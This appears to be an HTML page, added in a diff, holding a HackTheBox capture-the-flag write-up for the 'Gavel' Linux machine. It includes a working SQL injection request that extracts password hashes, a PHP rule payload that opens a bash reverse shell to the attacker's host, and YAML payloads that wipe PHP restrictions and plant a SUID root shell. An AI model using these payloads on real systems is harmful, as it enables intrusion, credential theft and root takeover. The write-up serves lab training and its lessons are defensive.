@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gavel - HackTheBox Writeup</title>
+    <style>
+        /* ========================================
+           HACK THE BOX WRITEUP THEME
+           ======================================== */
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0f1419;
+            color: #c5d1d8;
+            font-family: 'Segoe UI', 'Ubuntu', 'Roboto', sans-serif;
+            line-height: 1.8;
+            margin: 0;
+            padding: 40px 30px;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Headings */
+        h1, h2, h3 {
+            color: #9fef00;
+            font-weight: 600;
+            margin-top: 2em;
+            margin-bottom: 0.8em;
+            letter-spacing: 0.5px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            border-bottom: 3px solid #9fef00;
+            padding-bottom: 15px;
+            margin-top: 0;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 1.8em;
+            border-left: 4px solid #9fef00;
+            padding-left: 15px;
+            margin-top: 2.5em;
+        }
+
+        h3 {
+            font-size: 1.3em;
+            color: #00d9ff;
+            margin-top: 1.8em;
+        }
+
+        h4 {
+            font-size: 1.1em;
+            color: #00d9ff;
+            margin-top: 1.5em;
+            margin-bottom: 0.8em;
+        }
+
+        /* Paragraphs */
+        p {
+            margin-bottom: 1.2em;
+            color: #c5d1d8;
+        }
+
+        /* Strong/Bold */
+        strong {
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        /* Links */
+        a {
+            color: #00d9ff;
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: #9fef00;
+            border-bottom: 1px solid #9fef00;
+        }
+
+        /* Info Box */
+        .info-box {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .info-box p {
+            margin: 0.5em 0;
+        }
+
+        .info-box strong {
+            color: #00d9ff;
+        }
+
+        /* Code blocks */
+        pre {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 1.5em 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        code {
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            color: #9fef00;
+        }
+
+        /* Inline code */
+        p code, li code {
+            background: #1a2332;
+            color: #9fef00;
+            padding: 3px 8px;
+            border-radius: 4px;
+            border: 1px solid #2d3748;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1em 0 1em 2em;
+            color: #c5d1d8;
+        }
+
+        li {
+            margin-bottom: 0.5em;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 2px solid #2d3748;
+            margin: 1.5em 0;
+            display: block;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Image placeholder for missing images */
+        .img-placeholder {
+            background: #1a2332;
+            border: 2px dashed #2d3748;
+            border-radius: 8px;
+            padding: 40px;
+            margin: 1.5em 0;
+            text-align: center;
+            color: #5c6773;
+            font-style: italic;
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        th {
+            background: #1f2937;
+            color: #9fef00;
+            font-weight: 600;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover {
+            background: #1f2937;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1a2332;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #9fef00;
+            border-radius: 5px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #8dd900;
+        }
+
+        /* Special styling for specific sections */
+        .command-output {
+            color: #a3b3bc;
+        }
+
+        .redacted {
+            color: #ff79c6;
+            font-weight: bold;
+        }
+
+        /* Header banner */
+        .header-banner {
+            background: linear-gradient(135deg, #1a2332 0%, #0f1419 100%);
+            border: 1px solid #2d3748;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 2em;
+            text-align: center;
+        }
+
+        .header-banner h1 {
+            margin: 0;
+            border: none;
+            padding: 0;
+        }
+
+        .header-banner p {
+            color: #9fef00;
+            font-size: 1.1em;
+            margin: 10px 0 0 0;
+        }
+
+        /* Highlight boxes */
+        .highlight {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #ffc107;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .highlight strong {
+            color: #ffc107;
+        }
+
+        .success {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #28a745;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .success strong {
+            color: #28a745;
+        }
+
+        .warning {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #dc3545;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .warning strong {
+            color: #dc3545;
+        }
+
+        /* Step boxes */
+        .step {
+            background: #1a2332;
+            border: 1px solid #2d3748;
+            border-left: 4px solid #00d9ff;
+            padding: 15px 20px;
+            margin: 1.5em 0;
+            border-radius: 8px;
+        }
+
+        .step h4 {
+            margin-top: 0;
+            color: #00d9ff;
+        }
+
+        /* Author footer */
+        .author {
+            text-align: center;
+            margin-top: 3em;
+            padding-top: 2em;
+            border-top: 1px solid #2d3748;
+            color: #5c6773;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-banner">
+        <h1>Gavel</h1>
+        <p>HackTheBox Writeup</p>
+    </div>
+
+    <div class="info-box">
+        <p><strong>Box Name:</strong> Gavel</p>
+        <p><strong>Difficulty:</strong> Medium</p>
+        <p><strong>OS:</strong> Linux</p>
+        <p><strong>Date Completed:</strong> January 2026</p>
+        <p><strong>IP Address:</strong> 10.129.x.x</p>
+    </div>
+
+    <h2>Summary</h2>
+    <p>Gavel is a Linux machine featuring a vulnerable web auction application. Initial access is gained through an exposed Git repository revealing SQL injection and PHP code injection vulnerabilities. Privilege escalation involves exploiting a custom daemon that executes YAML-submitted PHP code as root, requiring a two-stage attack to bypass security restrictions.</p>
+
+    <h2>Reconnaissance</h2>
+
+    <h3>Nmap Scan</h3>
+    <pre><code>nmap -sC -sV -A -T4 10.129.x.x</code></pre>
+
+    <p><strong>Results:</strong></p>
+    <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.52</code></pre>
+
+    <div class="screen1">
+        <img src="C:\PrivIT\HTB\_resources\screen1.png">
+    </div>
+
+    <h3>Web Enumeration</h3>
+    <p>Browsing to the web application reveals a "Gavel Auction" platform where users can register, login, and participate in bidding on various items.</p>
+
+    <h4>Directory Discovery</h4>
+    <pre><code>gobuster dir -u http://gavel.htb -w commonsubdir.txt</code></pre>
+
+    <div class="highlight">
+        <p><strong>Key Finding:</strong> The <code>.git</code> directory is exposed and accessible!</p>
+    </div>
+
+	<div class="screen2">
+        <img src="C:\PrivIT\HTB\_resources\screen2.png">
+    </div>
+
+    <h2>Initial Access</h2>
+
+    <h3>Git Repository Extraction</h3>
+    <p>Dumping the exposed git repository to analyze the application source code:</p>
+
+    <pre><code>git-dumper http://gavel.htb/.git/ gavel-src</code></pre>
+
+	<div class="screen3">
+        <img src="C:\PrivIT\HTB\_resources\screen3.png">
+    </div>
+
+    <h3>Source Code Analysis</h3>
+
+    <h4>Vulnerability #1: Database Credentials</h4>
+    <p><strong>File:</strong> <code>includes/config.php</code></p>
+    <pre><code>define('DB_HOST', 'localhost');
+define('DB_NAME', 'gavel');
+define('DB_USER', 'gavel');
+define('DB_PASS', 'gavel');</code></pre>
+
+After attempting to connect to the DB using mySQL I get a connection failed. It seems like the DB is protected. Moving on to other attack vectors.
+
+    <h4>Vulnerability #2: SQL Injection</h4>
+    <p><strong>File:</strong> <code>inventory.php</code></p>
+    <pre><code>$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
+$col = "`" . str_replace("`", "", $sortItem) . "`";
+...
+$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");</code></pre>
+    
+    <p>The <code>$col</code> variable is directly interpolated into the query string, creating a SQL injection vulnerability through both <code>sort</code> and <code>user_id</code> parameters despite using prepared statements.</p>
+
+    <h4>Vulnerability #3: PHP Code Injection</h4>
+    <p><strong>File:</strong> <code>includes/bid_handler.php</code></p>
+    <pre><code>runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
+$allowed = ruleCheck($current_bid, $previous_bid, $bidder);</code></pre>
+    
+    <p>The <code>$rule</code> from the database is directly used as the function body with zero sanitization.</p>
+
+    <h2>Exploitation</h2>
+
+    <h3>Exploiting SQL Injection</h3>
+    <p>The SQLi requires a combined attack on both <code>user_id</code> and <code>sort</code> parameters:</p>
+
+    <pre><code>GET /inventory.php?user_id=x`%20FROM%20(SELECT%20group_concat(username,0x3a,password)%20AS%20`'x`%20FROM%20users)y;--%20-&sort=\?;--%20-%00 HTTP/1.1
+Host: gavel.htb
+Cookie: gavel_session=YOUR_SESSION_COOKIE</code></pre>
+
+    <div class="warning">
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><code>\?</code> - Backslash breaks PDO's parameter detection</li>
+            <li><code>'x</code> - Single quote in the alias is critical for query structure</li>
+            <li><code>%00</code> - Null byte causes string truncation at C level in MySQL driver</li>
+        </ul>
+    </div>
+
+	<div class="screen4">
+        <img src="C:\PrivIT\HTB\_resources\screen4.png">
+    </div>
+
+    <p><strong>Extracted Credentials:</strong></p>
+    <pre><code>auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
+test:$2y$10$7QZ0/Y1YIa5EWM4E1aV95..WDKQN9WDe.j/tt882g0EYR/0oIh1/G
+test1:$2y$10$RcA4McYIX0m1rai/sv2x4egaNpiyib4Nz6pM.Pad3NWDWAXy.lwyG</code></pre>
+
+	<div class="screen5">
+        <img src="C:\PrivIT\HTB\_resources\screen5.png">
+    </div>
+
+    <h3>Cracking Password Hash</h3>
+    <pre><code>echo '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > hash.txt
+hashcat -m 3200 hash.txt /rockyou.txt</code></pre>
+
+    <div class="success">
+        <p><strong>Password Cracked:<span class="redacted">&lt;REDACTED&gt;</span></strong> </p>
+    </div>
+
+    <h2>Remote Code Execution</h2>
+
+    <div class="step">
+        <h4>Step 1: Login to Web Application</h4>
+        <p>Navigate to <code>http://gavel.htb/login.php</code></p>
+        <p>Credentials: <code>auctioneer:<span class="redacted">&lt;REDACTED&gt;</span></code></p>
+    </div>
+
+	<div class="screen6">
+        <img src="C:\PrivIT\HTB\_resources\screen6.png">
+    </div>
+
+    <div class="step">
+        <h4>Step 2: Access Admin Panel</h4>
+        <p>Navigate to <code>http://gavel.htb/admin.php</code> (available for auctioneer role)</p>
+    </div>
+
+	<div class="screen7">
+        <img src="C:\PrivIT\HTB\_resources\screen7.png">
+    </div>
+
+    <div class="step">
+        <h4>Step 3: Inject RCE Payload</h4>
+        <p>In the "Edit rule" field for any auction item:</p>
+        <pre><code>return system('bash -c "bash -i >& /dev/tcp/10.10.15.x/4444 0>&1"');</code></pre>
+    </div>
+
+	<div class="screen8">
+        <img src="C:\PrivIT\HTB\_resources\screen8.png">
+    </div>
+
+    <div class="step">
+        <h4>Step 4: Setup Listener</h4>
+        <pre><code>nc -lvnp 4444</code></pre>
+    </div>
+
+    <div class="step">
+        <h4>Step 5: Trigger Execution</h4>
+        <p>Place any bid on the bidding page to trigger rule evaluation and get reverse shell.</p>
+    </div>
+
+	<div class="screen9">
+        <img src="C:\PrivIT\HTB\_resources\screen9.png">
+    </div>
+	
+	<div class="screen10">
+        <img src="C:\PrivIT\HTB\_resources\screen10.png">
+    </div>
+
+    <h3>Shell Stabilization</h3>
+    <pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Press Ctrl+Z
+stty raw -echo; fg
+# Press Enter twice
+export TERM=xterm</code></pre>
+
+    <h2>User Flag</h2>
+
+    <p>Switch to auctioneer user:</p>
+    <pre><code>su auctioneer
+# Password:<span class="redacted">&lt;REDACTED&gt;</span></code></pre>
+
+    <div class="success">
+        <p><strong>User Flag:</strong></p>
+        <pre><code>cat ~/user.txt</code></pre>
+    </div>
+
+	<div class="screen11">
+        <img src="C:\PrivIT\HTB\_resources\screen11.png">
+    </div>
+
+    <h2>Privilege Escalation</h2>
+
+    <h3>Enumeration</h3>
+    
+    <p>Check user groups:</p>
+    <pre><code>id
+# uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)</code></pre>
+
+    <div class="highlight">
+        <p><strong>Key Finding:</strong> Member of <code>gavel-seller</code> group!</p>
+    </div>
+
+    <p>Check running processes:</p>
+    <pre><code>ps aux | grep root</code></pre>
+
+    <p><strong>Interesting processes running as root:</strong></p>
+    <ul>
+        <li><code>/root/scripts/auction_watcher.sh</code></li>
+        <li><code>/opt/gavel/gaveld</code> - Custom daemon</li>
+        <li><code>/root/scripts/timeout_gavel.py</code></li>
+    </ul>
+
+    <h3>Analyzing the Gavel Daemon</h3>
+
+    <p>Check <code>/opt/gavel</code> directory:</p>
+    <pre><code>ls -la /opt/gavel/</code></pre>
+
+    <pre><code>drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
+-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
+-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
+drwxr-x--- 2 root root  4096 Nov  5 12:46 submission</code></pre>
+
+    <p>Check the socket:</p>
+    <pre><code>ls -la /var/run/gaveld.sock
+
+srw-rw---- 1 root gavel-seller 0 Dec 28 10:10 /var/run/gaveld.sock</code></pre>
+
+    <div class="success">
+        <p>The socket is writable by the <code>gavel-seller</code> group!</p>
+    </div>
+
+    <p>Client utility discovered: <code>/usr/local/bin/gavel-util</code></p>
+	<p>This utility allows to submit a new bidding item in YAML format. (See previous ls -la where sample.yaml is listed.)</p>
+
+    <p>Check PHP configuration restrictions:</p>
+    <pre><code>cat /opt/gavel/.config/php/php.ini
+
+open_basedir=/opt/gavel
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,
+proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,
+create_function,preg_replace,unserialize,extract,file_get_contents,
+fopen,include,require,require_once,include_once,fsockopen,
+pfsockopen,stream_socket_client</code></pre>
+
+	<div class="screen12">
+        <img src="C:\PrivIT\HTB\_resources\screen12.png">
+    </div>
+
+    <h2>Two-Stage Exploitation</h2>
+
+    <p>The <code>gaveld</code> daemon processes YAML submissions and executes the <code>rule</code> field as PHP code with root privileges. However, PHP restrictions prevent direct exploitation.</p>
+
+    <div class="warning">
+        <p><strong>Strategy:</strong></p>
+        <ol>
+            <li>First submission: Disable PHP security restrictions</li>
+            <li>Second submission: Create SUID bash binary</li>
+        </ol>
+    </div>
+
+    <h3>Stage 1: Disable PHP Restrictions</h3>
+
+    <p>Create malicious YAML:</p>
+    <pre><code>cat > /tmp/stage1.yaml << 'EOF'
+---
+name: "Config Bypass"
+description: "Disable PHP security restrictions"
+image: "test.png"
+price: 10000
+rule_msg: "Bypass attempt"
+rule: "file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n'); return true;"
+EOF</code></pre>
+
+    <p>Submit via gavel-util:</p>
+    <pre><code>gavel-util submit /tmp/stage1.yaml</code></pre>
+
+    <p>This overwrites the PHP configuration, removing <code>open_basedir</code> and <code>disable_functions</code> restrictions.</p>
+
+	<div class="screen13">
+        <img src="C:\PrivIT\HTB\_resources\screen13.png">
+    </div>
+
+    <h3>Stage 2: Create SUID Bash</h3>
+
+    <p>Create second payload:</p>
+    <pre><code>cat > /tmp/stage2.yaml << 'EOF'
+---
+name: "SUID Bash"
+description: "Create root shell"
+image: "test.png"
+price: 10000
+rule_msg: "Root shell"
+rule: "copy('/bin/bash', '/opt/gavel/.config/rootbash'); chmod('/opt/gavel/.config/rootbash', 04755); return true;"
+EOF</code></pre>
+
+    <p>Submit:</p>
+    <pre><code>gavel-util submit /tmp/stage2.yaml</code></pre>
+
+    <p>This creates a SUID copy of bash at <code>/opt/gavel/.config/rootbash</code></p>
+
+	<div class="screen14">
+        <img src="C:\PrivIT\HTB\_resources\screen14.png">
+    </div>
+
+    <h3>Execute Root Shell</h3>
+
+    <pre><code>/opt/gavel/.config/rootbash -p</code></pre>
+
+    <pre><code>rootbash-5.1# whoami
+root
+rootbash-5.1# id
+uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) egid=0(root) groups=0(root),1001(gavel-seller),1002(auctioneer)</code></pre>
+
+	<div class="screen15">
+        <img src="C:\PrivIT\HTB\_resources\screen15.png">
+    </div>
+
+    <h2>Root Flag</h2>
+
+    <div class="success">
+        <p><strong>Root Flag:</strong></p>
+        <pre><code>cat /root/root.txt</code></pre>
+    </div>
+
+	<div class="screen16">
+        <img src="C:\PrivIT\HTB\_resources\screen16.png">
+    </div>
+
+    <h2>Key Vulnerabilities Summary</h2>
+
+    <table>
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Vulnerability</th>
+                <th>Impact</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>1</td>
+                <td>Exposed Git Repository</td>
+                <td>Source code disclosure, credential exposure</td>
+            </tr>
+            <tr>
+                <td>2</td>
+                <td>SQL Injection</td>
+                <td>Database compromise, credential extraction</td>
+            </tr>
+            <tr>
+                <td>3</td>
+                <td>PHP Code Injection</td>
+                <td>Remote code execution</td>
+            </tr>
+            <tr>
+                <td>4</td>
+                <td>Insecure Daemon Design</td>
+                <td>Privilege escalation to root</td>
+            </tr>
+            <tr>
+                <td>5</td>
+                <td>Configuration File Writability</td>
+                <td>Security bypass, privilege escalation</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>Lessons Learned</h2>
+
+    <ul>
+        <li>Exposed version control systems reveal entire application internals</li>
+        <li>Complex SQL injection can bypass parameter binding when column names are dynamically constructed</li>
+        <li>Dynamic code execution is extremely dangerous with elevated privileges</li>
+        <li>Configuration files should never be writable by unprivileged processes</li>
+        <li>Multi-stage attacks can systematically bypass security restrictions</li>
+        <li>Defense in depth is essential</li>
+    </ul>
+
+    <h2>Tools Used</h2>
+    <ul>
+        <li>Nmap</li>
+        <li>Gobuster</li>
+        <li>Git-dumper</li>
+        <li>Burp Suite</li>
+        <li>Hashcat</li>
+        <li>Netcat</li>
+    </ul>
+
+    <div class="author">
+        <p>Author: Tommie03</p>
+    </div>
+</body>
+</html>
